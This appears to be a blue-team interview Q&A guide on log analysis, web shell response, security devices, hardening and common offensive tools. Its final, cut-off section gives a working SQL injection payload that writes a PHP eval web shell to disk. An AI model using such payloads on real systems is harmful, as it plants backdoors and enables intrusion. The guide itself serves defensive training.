# Operational Depth for Blue Teams

---

## Q: How do you handle false positives from security devices?

**A:** False positives from external sources typically indicate a need for device policy tuning and do not require immediate action. For internal false positives, you should:

1. Consult with the responsible team to determine the root cause.
2. Add exceptions or whitelist rules if the traffic is confirmed to be legitimate.
3. Document the decision for future reference.

---

## Q: How do you distinguish between scanning traffic and manual attack traffic?

**A:** 

- **Scanning traffic:** Large volume, regular patterns, high frequency, and often contains tool‑specific signatures (e.g., in User‑Agent, headers, or payloads). Tools like AWVS, Nessus, and AppScan leave identifiable fingerprints in request URLs, headers, or body.
- **Manual traffic:** Smaller volume, irregular intervals, and less predictable patterns.

You can use Wireshark filters (e.g., `http contains "xxx"`) to search for keywords and identify anomalous patterns.

---

## Q: What is the process if a website is found to have a web shell?

**A:** 

1. **Isolate the site:** Take the website offline and, if necessary, disconnect the server from the network.
2. **Combine manual and automated detection:**
   - Use tools like D‑Shield Web Shell Killer, ShellPub, or online scanners to scan web directories.
   - Compare against a known‑good backup to identify new or modified files.
3. **Remediate:** Remove malicious files and restore from clean backups if possible.
4. **Strengthen security:** Regularly back up configuration files, apply patches, update components, enforce strong passwords, and monitor for anomalies.

---

## Q: How would you analyse a large log file?

**A:** 

- **Signature matching:** Use regular expressions to detect known attack patterns.
- **Statistical analysis:** Identify requests that occur significantly less often than the average.
- **Whitelist approach:** Establish a baseline of normal requests and flag anything outside it.
- **Machine learning (HMM):** Automatically model normal behaviour and flag deviations.
- **Use log analysis tools:** LogForensics, Graylog, Nagios, or the ELK Stack (Elasticsearch, Logstash, Kibana).

---

## Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?

**A:** 

- **PHP‑based:** Tongda OA, WeOffice Eoffice.
- **Java‑based:** WeOffice OA/Cloud Bridge, Zhiyuan OA, Lanling OA, Yongyou OA.
- **ASP‑based:** Qilai OA.

These are commonly used in enterprise environments and are frequent targets for attackers.

---

## Q: Can you describe common security devices and their functions?

**A:** 

- **IPS (Intrusion Prevention System):** Monitors network traffic and actively blocks or modifies malicious activity.
- **IDS (Intrusion Detection System):** Passively monitors and alerts on suspicious activity.
- **Firewall:** Enforces access control policies between networks with different trust levels.
- **Database Audit System:** Captures and analyses database access traffic to detect and log unauthorised queries.
- **Log Audit System:** Collects, stores, and analyses logs from various sources for security monitoring and compliance.
- **Bastion Host (Jump Server):** Centralised access control and audit for administrative users.
- **Vulnerability Scanner:** Identifies security weaknesses in systems and applications.
- **Security Situational Awareness Platform:** Aggregates and correlates security data to provide a holistic view of the environment.
- **Endpoint Security Management:** Combines antivirus, access control, and EDR capabilities.
- **WAF (Web Application Firewall):** Inspects HTTP/HTTPS traffic to block web attacks.
- **Honeypot:** A decoy system designed to attract and detect attackers.

---

## Q: What are the key areas of system hardening?

**A:** 

**Account Security:**
- **Windows:** Disable guest accounts, enforce account lockout policies, and restrict remote logins.
- **Linux:** Lock unnecessary accounts (`passwd -l`), restrict `sudo` usage, and configure login failure limits (`faillog`).

**Password Security:**
- **Windows:** Enforce complexity (uppercase, lowercase, digits, specials), minimum length, and password history.
- **Linux:** Check for empty passwords in `/etc/shadow`, set password expiration via `/etc/login.defs`.

**Service & Port Management:**
- Close or restrict high‑risk ports (e.g., SSH 22, Telnet 23, RDP 3389).
- Use firewalls (e.g., `iptables`) to block or limit access.

**File Permissions:**
- Set appropriate permissions (`chmod`) and use `chattr` to make critical files immutable.

**Logging & Auditing:**
- Configure system logging (`/var/log/messages`, `/var/log/secure`, etc.) and forward logs to a central server.

**Network Controls:**
- Disable unnecessary protocols (e.g., ICMP echo), restrict USB devices, and prevent users from modifying IP settings.

---

## Q: What security tools have you used?

**A:** 

- **SIEM/SOC:** OSSIM (open source).
- **IPS:** Snort, Security Onion.
- **Firewalls:** TinyWall, ClearOS, or commercial endpoint protection.
- **WAF:** ModSecurity, Website Security Dog, or Baota.
- **Threat Intelligence:** MISP, OpenCTI.
- **Vulnerability Scanning:** OpenVAS, AWVS, Nessus.
- **Bastion Host:** JumpServer (can manage Windows hosts).
- **Honeypot:** T‑Pot, HFish.

---

## Q: What is Cobalt Strike and how is it used?

**A:** Cobalt Strike is a commercial penetration testing tool used for adversary simulation and post‑exploitation. It operates in a client‑server model, allowing multiple operators to collaborate.

**Common use cases:**
- Creating listeners to receive reverse shells.
- Generating payloads (e.g., Windows executables, Office macros, HTML applications).
- Conducting phishing campaigns and lateral movement.

**Basic workflow:**
1. Start the server and connect with the client.
2. Set up a listener (IP/port).
3. Generate a payload and deliver it to the target.
4. When executed, the target connects back, establishing a session.

---

## Q: What is a WAF and how does it work?

**A:** A Web Application Firewall protects web applications by filtering and monitoring HTTP/HTTPS traffic. It can be deployed in various forms:

- **Non‑embedded:** Hardware appliances, cloud‑based, or virtual appliances.
- **Embedded:** Modules within web servers (e.g., Apache mod_security) or code‑level filters.

**How it works:** WAFs apply rule sets to inspect requests for malicious patterns (SQL injection, XSS, etc.) and take actions such as blocking, logging, or alerting.

---

## Q: Are you familiar with PowerShell?

**A:** PowerShell is a task automation and configuration management framework from Microsoft. It is widely used for system administration and security tasks.

**Common commands:** `pwd`, `ls`, `cd`, `mkdir`, `rm`, `Get-Process`, `Get-Date`, `Get-Host`.

In a security context, frameworks like PowerSploit leverage PowerShell for post‑exploitation, including information gathering, privilege escalation, and persistence.

---

## Q: What is Metasploit Framework (MSF) and how is it used?

**A:** Metasploit is an open‑source penetration testing framework that provides tools for reconnaissance, vulnerability detection, exploitation, and post‑exploitation.

**Key modules:**
- **Auxiliary:** Scanning, sniffing, and fingerprinting.
- **Exploits:** Code that leverages vulnerabilities to gain access.
- **Payloads:** Code to execute on the target (e.g., reverse shells).
- **Post:** Actions after successful exploitation (e.g., privilege escalation, data exfiltration).
- **Encoders:** Obfuscate payloads to evade detection.

**Typical workflow:**
1. Use auxiliary modules to discover vulnerabilities.
2. Select an exploit and set the appropriate payload.
3. Configure local listener settings.
4. Execute the exploit; if successful, a session is created for further actions.

---

## Q: What XSS platforms have you used?

**A:** 

- **BlueLotus XSS** (from the Blue-Lotus team).
- **xss‑platform** (open source).
- **BeEF** (Browser Exploitation Framework) – included in Kali Linux.
- **Postman** (for manual testing and payload crafting).

---

## Q: How can you write a web shell via SQL injection?

**A:** Writing a web shell requires:

- Knowledge of the web root path.
- File write permissions (usually requires `FILE` privilege in MySQL).
- The `secure_file_priv` setting not being restrictive.

**Common methods:**

- **Union + into outfile:**
  ```sql
  ' UNION SELECT 1,"<?php @eval($_POST['shell']);?>",3 INTO OUTFILE 'C:/path/to/shell.php'#
